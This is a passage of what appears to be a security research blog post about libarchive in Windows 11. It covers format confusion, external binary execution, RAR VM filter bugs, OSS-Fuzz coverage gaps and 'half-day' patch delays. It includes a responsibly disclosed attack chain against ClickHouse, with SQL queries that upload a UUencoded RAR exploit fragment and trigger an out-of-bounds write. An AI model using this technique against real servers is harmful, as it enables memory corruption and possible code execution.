+<p>In fact, the <code class="language-plaintext highlighter-rouge">archive_read_support_format_all</code> function in libarchive enables support for a total of 13 archive formats, including ar, cpio, lha, mtree, tar, xar, warc, 7zip, cab, rar, rar5, iso9660, and zip; the <code class="language-plaintext highlighter-rouge">archive_read_support_filter_all</code> function in libarchive enables support for a total of 13 filters, including bzip2, compress, gzip, lzip, lzma, xz, uu, rpm, lrzip, lzop, grzip, lz4, zstd.</p>
+
+<p>In addition, format and filer can be used simultaneously. For example, the tar format and gzip filter should be enabled to support the <code class="language-plaintext highlighter-rouge">.tar.gz</code> file format. So, the total number of Windows’ natively supported file formats is $13+13+13 \times 13 = 195$ ?</p>
+
+<p>Completely wrong! A maximum of 25 filters can be chained, e.g., <code class="language-plaintext highlighter-rouge">archive.rar.gzip.xz.uu.zstd.uu......</code>. That said, Windows 11 actually supports $13+13+13\times 13^{25}$ types of file formats, which equals <code class="language-plaintext highlighter-rouge">91733330193268616658399616035</code> formats! For free!</p>
+
+<p><strong>As a result, the attack surface has significantly expanded after the update. Any vulnerability in a file format within libarchive can be triggered on Windows. Additionally, parsing multiple filters simultaneously could also introduce security weaknesses.</strong></p>
+
+<h3 id="fun-fact-2-file-format-confusion">Fun Fact 2: File Format Confusion</h3>
+
+<p>When calling libarchive to decompress files, there is no need to specify the archive’s file format; libarchive automatically determines the format based on the content. However, there is a chance that File Format Confusion can happen when ZIP support is enabled. For example, if we create a demo3.rar archive and place a poc.zip file inside, the result will look like this:</p>
+
+<p><img src="/assets/img/blog/20250212/30.png" alt="" /></p>
+
+<p>If we double-click demo3.rar directly on Windows, we will find that only the poc2.txt file is visible, while the other folders, files, and even poc.zip are missing. This is because libarchive mistakenly identifies demo3.rar as a ZIP file!</p>
+
+<p>To understand the bug, let’s see how libarchive determines the file format for an archive. In <code class="language-plaintext highlighter-rouge">choose_format</code>, the <code class="language-plaintext highlighter-rouge">bid</code> function of the enabled formats is called, and the format whose <code class="language-plaintext highlighter-rouge">bid</code> returns the highest value is the one libarchive will treat the file as.
+<img src="/assets/img/blog/20250212/31.png" alt="" /></p>
+
+<p>Take <code class="language-plaintext highlighter-rouge">ar</code>’s <code class="language-plaintext highlighter-rouge">bid</code> function, <code class="language-plaintext highlighter-rouge">archive_read_format_ar_bid</code>, for example, if the beginning 8 bytes of an archive is <code class="language-plaintext highlighter-rouge">"!&lt;arch&gt;\n"</code>, the function will return 64, which should be derived from $8\ bits \times 8\ bytes = 64$:
+<img src="/assets/img/blog/20250212/32.png" alt="" /></p>
+
+<p>Next, the RAR format’s highest score is only 30. Although it’s unclear how the number was determined, if each file format is checked starting from the beginning of the file, it should be difficult to create a polyglot that would break this mechanism, right?
+<img src="/assets/img/blog/20250212/33.png" alt="" /></p>
+
+<p>But, there is a special mode for ZIP in libarchive: seekable. In other words, the ZIP signature does not need to be at the beginning of the file; libarchive will search for it itself. The highest value for a seekable ZIP is 32:
+<img src="/assets/img/blog/20250212/34.png" alt="" /></p>
+
+<p>The consequence is that when a RAR archive contains a ZIP file and the RAR’s compression ratio is low enough to leave the ZIP signature untouched, libarchive will incorrectly treat the RAR file as a ZIP file.</p>
+
+<h3 id="fun-fact-3-sometimes-libarchive-tries-to-spawn-an-external-executable">Fun Fact 3: Sometimes, Libarchive Tries to Spawn an External Executable</h3>
+
+<p>By reviewing the source code of libarchive, we found that if some libraries are missed during compiling, libarchive will change its behavior from using the library to executing commands to decompressing the archive:
+<img src="/assets/img/blog/20250212/35.png" alt="" /></p>
+
+<p>Then we decompiled the <code class="language-plaintext highlighter-rouge">archiveint.dll</code>, which is the forked libarchive on Windows. We confirmed that the function for decompressing some file formats will try to execute the external binary, e.g., <code class="language-plaintext highlighter-rouge">lzop_bidder_init</code>:
+<img src="/assets/img/blog/20250212/36.png" alt="" /></p>
+
+<p>Plus, “libarchive decides which format to use for extraction based on the file content,” all we need to do is change the extension of an lzop compressed file to <code class="language-plaintext highlighter-rouge">.rar</code>, and double-click it to trigger the corresponding lzop extraction function <code class="language-plaintext highlighter-rouge">lzop_bidder_init</code>:
+<img src="/assets/img/blog/20250212/37.png" alt="" /></p>
+
+<p>At the end, we’ll see that <code class="language-plaintext highlighter-rouge">explorer.exe</code> is trying to execute <code class="language-plaintext highlighter-rouge">lzop</code> in <code class="language-plaintext highlighter-rouge">PATH</code> to decompress the archive:
+<img src="/assets/img/blog/20250212/38.png" alt="" /></p>
+
+<h3 id="rces-reported-by-morse-cve-2024-20696-and-cve-2024-20697">RCEs Reported by MORSE: CVE-2024-20696 and CVE-2024-20697</h3>
+
+<p>So far, it’s clear that libarchive introduces numerous attack surfaces. In fact, Windows also patched two vulnerabilities reported by Microsoft’s Offensive Research Security Engineering (MORSE) team in January 2024, specifically the RCE vulnerabilities <a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-20696">CVE-2024-20696</a> and <a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-20697">CVE-2024-20697</a>.</p>
+
+<h4 id="cve-2024-20696-oob-write-in-copy_from_lzss_window_to_unp">CVE-2024-20696: OOB Write in <code class="language-plaintext highlighter-rouge">copy_from_lzss_window_to_unp</code></h4>
+
+<p>While extracting RAR files, the fourth argument of <code class="language-plaintext highlighter-rouge">copy_from_lzss_window_to_unp</code>, <code class="language-plaintext highlighter-rouge">length</code>, is calculated based on the state after lzss decompression, representing the copy length. However, it was incorrectly defined as an int. This mistake allows an attacker to manipulate the lzss data, causing length to become a negative value, bypassing validation checks, and resulting in an out-of-bounds write vulnerability.</p>
+
+<p><img src="/assets/img/blog/20250212/39.png" alt="" /></p>
+
+<h4 id="cve-2024-20697-oob-write-in-execute_filter_e8">CVE-2024-20697: OOB Write in <code class="language-plaintext highlighter-rouge">execute_filter_e8</code></h4>
+
+<p>It’s also a vulnerability that happens when extracting RAR files. If an RAR file contains an e8 filter, libarchive will run into the <code class="language-plaintext highlighter-rouge">execute_filter_e8</code> function. (the filter here is defined by RAR, not the filter of libarchive we mentioned earlier)
+The problem is that although there is a check in <code class="language-plaintext highlighter-rouge">execute_filter_e8</code> to ensure the variable <code class="language-plaintext highlighter-rouge">length</code> is larger or equal to 4, the <code class="language-plaintext highlighter-rouge">length</code> will be used in a for loop for <code class="language-plaintext highlighter-rouge">length-5</code>. So, when the <code class="language-plaintext highlighter-rouge">length</code> is 4, the loop will run 0x100000000 times, causing an out-of-bounds write.</p>
+
+<p><img src="/assets/img/blog/20250212/40.png" alt="" /></p>
+
+<h4 id="fuzzing-why-oss-fuzz-never-found-these">Fuzzing: Why OSS-Fuzz Never Found These?</h4>
+
+<p><img src="/assets/img/blog/20250212/41.png" alt="" /></p>
+
+<p>To reproduce these two CVEs, we must construct RAR files, which is time-consuming. In CVE-2024-20696, we have to construct data of lzss that causes the <code class="language-plaintext highlighter-rouge">length</code> to become a negative number; in CVE-2024-20697, we have to put an e8 filter in an RAR archive. Instead of building RAR bytes by bytes, we chose to collect RAR archives, especially those with the e8 filter, and feed them to the AFL++ fuzzer. To our surprise, it only took 56 seconds to find the first crash for CVE-2024-20697:
+<img src="/assets/img/blog/20250212/42.png" alt="" /></p>
+
+<p>It’s great that the crash happened quickly, but here’s the big problem: OSS-Fuzz has been Fuzzing libarchive 24/7 since at least 2016, so how can a vulnerability found in 56 seconds not be discovered yet?
+<img src="/assets/img/blog/20250212/43.png" alt="" /></p>
+
+<p>From the OSS-Fuzz summary for libarchive, we can see that in June 2024, the code coverage of libarchive was only 15.03%:
+<img src="/assets/img/blog/20250212/44.png" alt="" /></p>
+
+<p>And seems it has lasted a long time:
+<img src="/assets/img/blog/20250212/45.png" alt="" /></p>
+
+<p>From the file view, it is obvious that some file formats are basically untested. For example, the coverage of <code class="language-plaintext highlighter-rouge">archive_read_support_format_rar.c</code> is only 4.07%:
+<img src="/assets/img/blog/20250212/46.png" alt="" /></p>
+
+<h4 id="the-answer-revealed">The Answer Revealed</h4>
+
+<p>While preparing our talks, we noticed a pull request in the libarchive repository. It turns out that though they enabled the <code class="language-plaintext highlighter-rouge">DONT_FAIL_ON_CRC_ERROR</code> flag for CMake while compiling libarchive for OSS-Fuzz, they didn’t define that option in CMake!?
+<img src="/assets/img/blog/20250212/47.png" alt="" /></p>
+
+<p>The <code class="language-plaintext highlighter-rouge">DONT_FAIL_ON_CRC_ERROR</code> flag allowed libarchive to continue processing a file even when the CRC check failed. As we all know, fuzzers are generally poor at generating correct checksums. This means that the long-term low coverage of OSS-Fuzz was due to the fuzzer’s inability to produce valid CRC values to pass the checks.</p>
+
+<p>After the fix, a significant improvement in OSS-Fuzz’s coverage of libarchive can be observed, increasing from 15.03% to 63.10%:
+<img src="/assets/img/blog/20250212/48.png" alt="" /></p>
+
+<p>From the file view, the code coverage for individual file formats is also improved:
+<img src="/assets/img/blog/20250212/49.png" alt="" /></p>
+
+<h4 id="keep-fuzzing">Keep Fuzzing</h4>
+
+<p><img src="/assets/img/blog/20250212/50.png" alt="" /></p>
+
+<p>While conducting the code review, we kept AFL++ working for us. At the end of our research, the fuzzer found two out-of-bound read vulnerabilities: CVE-2024-48957 and CVE-2024-48958.</p>
+
+<p><img src="/assets/img/blog/20250212/51.png" alt="" /></p>
+
+<h3 id="cve-2024-26256-libarchive-remote-code-execution-vulnerability">CVE-2024-26256: Libarchive Remote Code Execution Vulnerability</h3>
+
+<p>After analyzing the vulnerabilities, CVE-2024-20696 and CVE-2024-20697, found by Microsoft, we found they are both in the <code class="language-plaintext highlighter-rouge">archive_read_support_format_rar.c</code> and both in the newly added functions within the previous three years.
+<img src="/assets/img/blog/20250212/52.png" alt="" /></p>
+
+<p>We decided to review RAR to investigate whether there are any other vulnerabilities. The first thing we wanted to understand was what filter_e8 refers to in CVE-2024-20697 and what the “filter” mentioned in the commit message “support RAR filters” means.</p>
+
+<h4 id="the-vm-in-rar">The VM in RAR</h4>
+
+<p>To understand <code class="language-plaintext highlighter-rouge">filter_e8</code>, we must know that there is a VM in RAR! There is actually a register-based VM in RAR. The VM can be used to run a custom program to improve the compression ratio of an RAR file.</p>
+
+<p>When creating an RAR file, a custom “filter” program can be included. The <code class="language-plaintext highlighter-rouge">filter_e8</code> is one such program, designed to improve the compression ratio for Intel binaries. The “e8” in its name refers to the near call opcode in the Intel instruction set.</p>
+
+<p><img src="/assets/img/blog/20250212/53.png" alt="" /></p>
+
+<p>But what is the correlation between call instruction and improved compression ratio?</p>
+
+<p>Take the following small program as an example: if there are two <code class="language-plaintext highlighter-rouge">call</code> instructions that will call <code class="language-plaintext highlighter-rouge">funcA</code>, located at addresses <code class="language-plaintext highlighter-rouge">0</code> and <code class="language-plaintext highlighter-rouge">0x10</code> respectively, we can see in the machine code that the near <code class="language-plaintext highlighter-rouge">call</code> instruction starts with <code class="language-plaintext highlighter-rouge">0xe8</code>, followed by 4 bytes, which corresponds to the <code class="language-plaintext highlighter-rouge">rel32</code> in the manual. The <code class="language-plaintext highlighter-rouge">rel32</code> value represents the relative offset between the address of the target function and the address of the instruction following the <code class="language-plaintext highlighter-rouge">call</code> instruction. For example, the <code class="language-plaintext highlighter-rouge">rel32</code> value of the first <code class="language-plaintext highlighter-rouge">call</code> instruction is <code class="language-plaintext highlighter-rouge">0x1b</code>, which is calculated by subtracting the address of the next instruction (0+5) from the address of the target function (0x20):
+<img src="/assets/img/blog/20250212/54.png" alt="" /></p>
+
+<p>Both instructions are used to call <code class="language-plaintext highlighter-rouge">funcA</code>, but due to their different machine code representations, the compression ratio is lower. However, since the <code class="language-plaintext highlighter-rouge">rel32</code> value can be easily calculated, it can be replaced with the absolute address of the target function, making the instructions identical and improving the compression ratio:
+<img src="/assets/img/blog/20250212/55.png" alt="" /></p>
+
+<p>While decompressing, the <code class="language-plaintext highlighter-rouge">e8 filter</code> will be used to recover the replaced <code class="language-plaintext highlighter-rouge">rel32</code>:</p>
+
+<p><img src="/assets/img/blog/20250212/56.png" alt="" /></p>
+
+<p>To simplify the implementation, libarchive doesn’t fully implement the entire VM. Instead, it simply calculates the fingerprint of the filter using <code class="language-plaintext highlighter-rouge">crc32</code>. The relevant code can be found in <a href="https://github.com/libarchive/libarchive/blob/42565b88b5cc7441239269902a9d1735fd9ca0e2/libarchive/archive_read_support_format_rar.c#L3826">libarchive</a>:</p>
+<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">static</span> <span class="kt">int</span>
+<span class="nf">execute_filter</span><span class="p">(</span><span class="k">struct</span> <span class="nc">archive_read</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="k">struct</span> <span class="nc">rar_filter</span> <span class="o">*</span><span class="n">filter</span><span class="p">,</span> <span class="k">struct</span> <span class="nc">rar_virtual_machine</span> <span class="o">*</span><span class="n">vm</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">pos</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="k">if</span> <span class="p">(</span><span class="n">filter</span><span class="o">-&gt;</span><span class="n">prog</span><span class="o">-&gt;</span><span class="n">fingerprint</span> <span class="o">==</span> <span class="mh">0x1D0E06077D</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">execute_filter_delta</span><span class="p">(</span><span class="n">filter</span><span class="p">,</span> <span class="n">vm</span><span class="p">);</span>
+  <span class="k">if</span> <span class="p">(</span><span class="n">filter</span><span class="o">-&gt;</span><span class="n">prog</span><span class="o">-&gt;</span><span class="n">fingerprint</span> <span class="o">==</span> <span class="mh">0x35AD576887</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">execute_filter_e8</span><span class="p">(</span><span class="n">filter</span><span class="p">,</span> <span class="n">vm</span><span class="p">,</span> <span class="n">pos</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+  <span class="k">if</span> <span class="p">(</span><span class="n">filter</span><span class="o">-&gt;</span><span class="n">prog</span><span class="o">-&gt;</span><span class="n">fingerprint</span> <span class="o">==</span> <span class="mh">0x393CD7E57E</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">execute_filter_e8</span><span class="p">(</span><span class="n">filter</span><span class="p">,</span> <span class="n">vm</span><span class="p">,</span> <span class="n">pos</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
+  <span class="k">if</span> <span class="p">(</span><span class="n">filter</span><span class="o">-&gt;</span><span class="n">prog</span><span class="o">-&gt;</span><span class="n">fingerprint</span> <span class="o">==</span> <span class="mh">0x951C2C5DC8</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">execute_filter_rgb</span><span class="p">(</span><span class="n">filter</span><span class="p">,</span> <span class="n">vm</span><span class="p">);</span>
+  <span class="k">if</span> <span class="p">(</span><span class="n">filter</span><span class="o">-&gt;</span><span class="n">prog</span><span class="o">-&gt;</span><span class="n">fingerprint</span> <span class="o">==</span> <span class="mh">0xD8BC85E701</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">execute_filter_audio</span><span class="p">(</span><span class="n">filter</span><span class="p">,</span> <span class="n">vm</span><span class="p">);</span>
+
+  <span class="n">archive_set_error</span><span class="p">(</span><span class="o">&amp;</span><span class="n">a</span><span class="o">-&gt;</span><span class="n">archive</span><span class="p">,</span> <span class="n">ARCHIVE_ERRNO_FILE_FORMAT</span><span class="p">,</span> <span class="s">"No support for RAR VM program filter"</span><span class="p">);</span>
+  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>After RAR v5, filters became an enum type in the file format, making it possible to use only pre-defined filters. This can be observed in the <a href="https://www.rarlab.com/rar_add.htm">UnRAR source</a>:</p>
+
+<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">enum</span> <span class="n">FilterType</span> <span class="p">{</span>
+  <span class="c1">// These values must not be changed, because we use them directly</span>
+  <span class="c1">// in RAR5 compression and decompression code.</span>
+  <span class="n">FILTER_DELTA</span><span class="o">=</span><span class="mi">0</span><span class="p">,</span> <span class="n">FILTER_E8</span><span class="p">,</span> <span class="n">FILTER_E8E9</span><span class="p">,</span> <span class="n">FILTER_ARM</span><span class="p">,</span> 
+  <span class="n">FILTER_AUDIO</span><span class="p">,</span> <span class="n">FILTER_RGB</span><span class="p">,</span> <span class="n">FILTER_ITANIUM</span><span class="p">,</span> <span class="n">FILTER_TEXT</span><span class="p">,</span> 
+  
+  <span class="c1">// These values can be changed.</span>
+  <span class="n">FILTER_LONGRANGE</span><span class="p">,</span><span class="n">FILTER_EXHAUSTIVE</span><span class="p">,</span><span class="n">FILTER_NONE</span>
+<span class="p">};</span>
+</code></pre></div></div>
+
+<h4 id="code-review">Code Review</h4>
+
+<p>The concept of filters is interesting, and the vulnerabilities that Microsoft found are also related to the filter. So, we conducted a code review of <code class="language-plaintext highlighter-rouge">archive_read_support_format_rar.c</code>.</p>
+
+<p>After some time, we discovered a heap buffer overflow vulnerability in <code class="language-plaintext highlighter-rouge">copy_from_lzss_window</code>. The <code class="language-plaintext highlighter-rouge">length</code> parameter of <code class="language-plaintext highlighter-rouge">copy_from_lzss_window</code> is used directly in <code class="language-plaintext highlighter-rouge">memcpy</code> without any checks, while the buffer size is only 0x40004 bytes:
+<img src="/assets/img/blog/20250212/57.png" alt="" /></p>
+
+<p>From the places where <code class="language-plaintext highlighter-rouge">copy_from_lzss_window</code> is called, it can be observed that the function is used to copy data into the VM memory:
+<img src="/assets/img/blog/20250212/58.png" alt="" /></p>
+
+<p>The vulnerability itself is straightforward, but constructing a valid filter and data is a bit more complex. These elements are not immediately presented in the RAR file format, they are actually part of the data. Additionally, the data is encoded using Huffman coding, and it isn’t consumed byte by byte, but rather 7 bits at a time. Since this is not the focus of this article, we won’t delve into the details here, but we encourage readers to attempt reproducing the vulnerability.
+<img src="/assets/img/blog/20250212/59.png" alt="" /></p>
+
+<p>The vulnerability is <a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-26256">CVE-2024-26256</a>. The reason it was not detected by fuzzing is straightforward: the data must be exactly the same size as the value of <code class="language-plaintext highlighter-rouge">filter-&gt;blocklength</code>. However, fuzzers often trim files when their coverage is similar.</p>
+
+<h3 id="half-day-a-1-day-that-looks-like-a-0-day">Half-Day: A 1-Day That Looks Like a 0-Day</h3>
+
+<p>When we mentioned earlier the two vulnerabilities the Microsoft Offensive Research Security Engineering (MORSE) team reported, we said that constructing a PoC is a little complex. Perhaps someone immediately thought, “Why not check the GitHub repository of libarchive for test cases or commit messages?” Well, we did look—there was nothing.</p>
+
+<p>Because, at that time, libarchive hadn’t even been patched yet, or perhaps no one even knew the vulnerabilities existed! We can see that Microsoft had already fixed the libarchive fork used in Windows back in January:
+<img src="/assets/img/blog/20250212/60.png" alt="" /></p>
+
+<p>However, the corresponding two patches for libarchive were merged in May and April, respectively:
+<img src="/assets/img/blog/20250212/61.png" alt="" /></p>
+
+<p>Wouldn’t it mean that anyone who has been closely following Windows patches would immediately discover that there were two unpatched vulnerabilities in the libarchive upstream? These vulnerabilities would be considered 1-day for the Windows forked version of libarchive, because they have been discovered and patched. However, for libarchive upstream, they are 0-day, as no patch has been made, and the maintainers may even be unaware of the issue! We will refer to this situation as “0.5-day” or “Half-day” in the rest of the article.</p>
+
+<p>So, we began searching for large projects that use libarchive. We wanted to simulate a “Half-day attack” scenario and also believed that vendors incorporating libarchive in their software would be more willing to help us urge libarchive to patch the vulnerabilities.</p>
+
+<h3 id="attacking-clickhouse">Attacking ClickHouse</h3>
+
+<p>After some investigation, we discovered that ClickHouse uses libarchive for decompression, which likely contains the vulnerable code. In ClickHouse, we can interact with the data inside the archive through the file table engine:
+<img src="/assets/img/blog/20250212/62.png" alt="" /></p>
+
+<p>However, the manual also mentions that ClickHouse only supports zip, tar, and 7z file formats:
+<img src="/assets/img/blog/20250212/63.png" alt="" /></p>
+
+<p>But is that really the case? Aside from zip, both tar and 7z in ClickHouse are implemented by <code class="language-plaintext highlighter-rouge">TarArchiveReader</code> and <code class="language-plaintext highlighter-rouge">SevenZipArchiveReader</code>, both of which inherit from <code class="language-plaintext highlighter-rouge">LibArchiveReader</code>. The behavior of opening files with <code class="language-plaintext highlighter-rouge">LibArchiveReader</code> is implemented in the <code class="language-plaintext highlighter-rouge">open</code> function. In the <a href="https://github.com/ClickHouse/ClickHouse/blob/0bd3016a17dab23e64a7e550b2754ce7f7aa1d82/src/IO/Archives/LibArchiveReader.cpp#L150">source code</a>, you can see the familiar pattern:</p>
+
+<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="k">static</span> <span class="k">struct</span> <span class="nc">archive</span> <span class="o">*</span> <span class="nf">open</span><span class="p">(</span><span class="k">const</span> <span class="n">String</span> <span class="o">&amp;</span> <span class="n">path_to_archive</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="k">auto</span> <span class="o">*</span> <span class="n">archive</span> <span class="o">=</span> <span class="n">archive_read_new</span><span class="p">();</span>
+        <span class="k">try</span>
+        <span class="p">{</span>
+            <span class="n">archive_read_support_filter_all</span><span class="p">(</span><span class="n">archive</span><span class="p">);</span>
+            <span class="n">archive_read_support_format_all</span><span class="p">(</span><span class="n">archive</span><span class="p">);</span>
+</code></pre></div></div>
+
+<p>Yes, ClickHouse also uses the <code class="language-plaintext highlighter-rouge">archive_read_support_format_all</code> and the <code class="language-plaintext highlighter-rouge">archive_read_support_filter_all</code> to initialize the libarchive, which means we can trigger the vulnerabilities relative to RAR! All we need to do next is have ClickHouse decompress the files for us. Although the current decompression feature allows direct access to files on S3, <strong>it could not be used this way at the time</strong>:
+<img src="/assets/img/blog/20250212/64.png" alt="" /></p>
+
+<p>So, we must upload the file first. The following query will create a new table, which will be stored as a file:</p>
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">INSERT</span> <span class="k">INTO</span> <span class="k">TABLE</span> <span class="k">FUNCTION</span>
+<span class="n">file</span><span class="p">(</span><span class="s1">'poc.7z'</span><span class="p">,</span> <span class="s1">'Native'</span> <span class="p">,</span><span class="s1">'column1 String'</span><span class="p">)</span> <span class="k">VALUES</span> <span class="p">(</span><span class="s1">'payload'</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>Even so, the file generated this way would include the table’s metadata. With the metadata present, we cannot make libarchive treat it as a RAR file, thus preventing the vulnerability from being triggered:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>00000000: 0101 0763 6f6c 756d 6e31 0653 7472 696e  ...column1.Strin
+00000010: 6707 7061 796c 6f61 64                   g.payload
+</code></pre></div></div>
+
+<p>We needed to look for formats in ClickHouse’s Output Data Formats that dont’ have metadata at the beginning of the file. We decided to use <code class="language-plaintext highlighter-rouge">TabSeparatedRaw</code> because in <code class="language-plaintext highlighter-rouge">TabSeparatedRaw</code>:</p>
+
+<ul>
+  <li>Data is stored row by row.</li>
+  <li>Data within a row is separated by tabs.</li>
+</ul>
+
+<p>For example, if using the following two queries:</p>
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">INSERT</span> <span class="k">INTO</span> <span class="k">TABLE</span> <span class="k">FUNCTION</span>
+<span class="n">file</span><span class="p">(</span><span class="s1">'test.7z'</span><span class="p">,</span> <span class="s1">'TabSeparatedRaw'</span><span class="p">,</span> <span class="s1">'column1 String'</span><span class="p">)</span>
+<span class="k">VALUES</span> <span class="p">(</span><span class="s1">'row1 string'</span><span class="p">)</span>
+
+<span class="k">INSERT</span> <span class="k">INTO</span> <span class="k">TABLE</span> <span class="k">FUNCTION</span>
+<span class="n">file</span><span class="p">(</span><span class="s1">'test.7z'</span><span class="p">,</span> <span class="s1">'TabSeparatedRaw'</span><span class="p">,</span> <span class="s1">'column1 String'</span><span class="p">)</span>
+<span class="k">VALUES</span> <span class="p">(</span><span class="s1">'row2 string'</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>The content of the generated file would be:</p>
+<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>row1 string
+row2 string
+</code></pre></div></div>
+
+<p>Nonetheless, there is a constraint: the data cannot contain tabs or newlines.
+If we can overcome this, we can construct a valid RAR file! So, how can we avoid using tabs or newlines? It sounds complicated, but don’t forget that ClickHouse calls <code class="language-plaintext highlighter-rouge">archive_read_support_filter_all</code> to enable all filters for us! The one that fits the <code class="language-plaintext highlighter-rouge">TabSeparatedRaw</code> the most is UUencode. Data that has been UUencoded would look like this:</p>
+
+<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>begin 600 exploit.rar.uu
+M4F%R(1H'`,^0&lt;P``#0````````!287(A&amp;@&lt;`SY!S```-`````````%VI=("0
+M,0"VXP0`4,\+``(2'^X4O1EY5QTU#``@````;7-V8W(Q,#`N9&amp;QL`/#&lt;ZFP8
+M(AE0S(EB'!(",EM(4I0M-"H*"T6JBHJ!1$1T%IKHFBA0H*:(VV2VP)98R9+*
+M"*`T'I;&amp;]1&gt;J]&gt;HZ!&gt;KU4=(ZQTC:4VHB@J4WH2D-%--VSX9S);9IOO.9HF2E
+MH47O?/GG[Y^6LSGO/&gt;&gt;Z&gt;&gt;\]YJS!N3_(^_P3SS"O\S`P+6&lt;_V'P(,#`P,#`B
+M.EX#-(,!V$Z07A+LVZ?4@K:RB=`NN&lt;+9(IB&lt;?NX``Y[L`3`P,#``,`'/YCL*
+</code></pre></div></div>
+
+<p>Finally, all we need to do next is UUEncode the original RAR payload and then upload it:</p>
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">INSERT</span> <span class="k">INTO</span> <span class="k">TABLE</span> <span class="k">FUNCTION</span>
+<span class="n">file</span><span class="p">(</span><span class="s1">'poc.7z'</span><span class="p">,</span> <span class="s1">'TabSeparatedRaw'</span><span class="p">,</span> <span class="s1">'column1 String'</span><span class="p">)</span> <span class="k">VALUES</span> <span class="p">(</span><span class="n">uu_encoded_rar_payload</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>Ask ClickHouse to decompress it for us:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SELECT * FROM file('poc.7z :: **', RawBLOB)
+</code></pre></div></div>
+
+<p>That would successfully trigger the out-of-bounds write vulnerability:
+<img src="/assets/img/blog/20250212/65.png" alt="" /></p>
+
+<p>We reported those issues to the Bug Bounty program of ClickHouse on Bugcrowd:
+<img src="/assets/img/blog/20250212/66.png" alt="" /></p>
+
+<p>ClickHouse quickly <a href="https://github.com/ClickHouse/ClickHouse/commit/c8a3a0bb11ad1344fbb50b10f50f8eb2a962aa7f">fixed</a> the issue and was willing to help us urge libarchive to patch the vulnerabilities! While it’s unclear whether Microsoft informed the libarchive maintainers about the CVE-2024-20696 and CVE-2024-20697 vulnerabilities (since there’s no public information, and the <a href="https://github.com/libarchive/libarchive/security/advisories?state=draft">Security Advisories</a> on libarchive’s GitHub repository have no relevant details), as we mentioned earlier, these two vulnerabilities, initially discovered by Microsoft in the forked version of libarchive, were eventually patched in libarchive in May and April, ending the awkward “Half-day”  situation.</p>
+
+<h3 id="issue-tracking">Issue Tracking</h3>
+
+<p>In addition to reporting the two “Half-day” vulnerabilities mentioned earlier, don’t forget that we also reported three other 0-day vulnerabilities, each of which is as follows:</p>
+
+<ol>
+  <li>RCE fixed by Microsoft: CVE-2024-26256
+    <ul>
+      <li>Reported to libarhicve on 4/27</li>
+      <li>Fixed on 8/14</li>
+      <li>Closed on 9/28</li>
+    </ul>
+  </li>
+  <li>OOB read in <code class="language-plaintext highlighter-rouge">filter_audio</code>
+    <ul>
+      <li>Reported to libarhicve on 3/20</li>
+      <li>Fixed on 4/29</li>
+      <li>Closed on 9/28</li>
+    </ul>
+  </li>
+  <li>OOB read in <code class="language-plaintext highlighter-rouge">filter_delta</code>
+    <ul>
+      <li>Reported to libarhicve on 3/20</li>
+      <li>Fixed on 4/29</li>
+      <li>Closed on 9/28</li>
+    </ul>
+  </li>
+</ol>
+
+<p>After several months following the reports, these vulnerabilities were finally patched, by which time it was already September.
+<img src="/assets/img/blog/20250212/67.png" alt="" /></p>
+
+<h4 id="the-half-day-cycle-of-repetition">The “Half-day” Cycle of Repetition</h4>
+
+<p>The most severe one is CVE-2024-26256, a vulnerability we reported to Microsoft, which was already patched on Windows in April.
+<img src="/assets/img/blog/20250212/68.png" alt="" /></p>
+
+<p>When we reported the vulnerability CVE-2024-26256 in March, we asked MSRC whether they would submit the patch to libarchive’s GitHub repository, but we didn’t receive a response initially. After Microsoft patched CVE-2024-26256, we followed up to confirm if they had shared the vulnerability information with libarchive maintainers. MSRC replied, “If you wish, we encourage you to open a separate GitHub issue.” To avoid a “Half-day” situation, we immediately created an issue in libarchive’s Security Advisory after receiving their message:
+<img src="/assets/img/blog/20250212/69.png" alt="" /></p>
+
+<p>However, the “Half-day” situation still occurred due to a lack of response. In July, we submitted a PR to port Microsoft’s patch to libarchive. While we weren’t sure if this was the best fix, it was certainly better than leaving the issue unaddressed. As a result, history repeated itself, and we found ourselves stuck in a “Half-day” scenario again, from April until the patch was finally completed in September.</p>
+
+<h4 id="the-remaining-two-0-days">The Remaining Two 0-Days</h4>
+
+<p>Attentive readers may have already noticed that the issues we reported are not listed under the “Published” tab but rather under “Closed”:
+<img src="/assets/img/blog/20250212/70.png" alt="" /></p>
+
+<p>In addition to CVE-2024-26256, which we mentioned earlier, the other two vulnerabilities are out-of-bounds read issues that had not been assigned CVE identifiers at the time. When a patch is linked to an existing CVE number, it is generally understood to be a security fix. However, the other two vulnerabilities were not publicly disclosed. Given that libarchive is widely used across many software applications and services, many users may be unaware they are relying on it. The dependency chains within such software can be large and intricate. If developers or end-users do not recognize that a patch addresses a security issue, the fix may propagate slowly through the dependency chain, significantly increasing the risk exposure.</p>
+
